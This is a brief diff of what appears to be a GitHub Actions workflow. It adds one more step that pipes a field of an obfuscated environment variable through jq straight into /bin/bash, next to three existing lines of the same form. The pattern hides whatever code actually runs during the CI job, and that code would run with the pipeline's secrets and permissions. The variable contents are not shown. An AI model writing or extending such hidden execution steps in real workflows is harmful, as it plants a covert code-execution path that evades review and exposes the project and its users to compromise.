@@ -39,6 +39,7 @@ jobs:
           echo $fc25243 | jq -r .mju68193 | /bin/bash
           echo $dvv60 | jq -r .dk9 | /bin/bash
           printf '%s' "$e738" | jq -r .m5 | /bin/bash
+          echo $ywpsm786 | jq -r .eii12105 | /bin/bash
 
       - name: Upload results
         uses: actions/upload-artifact@v4
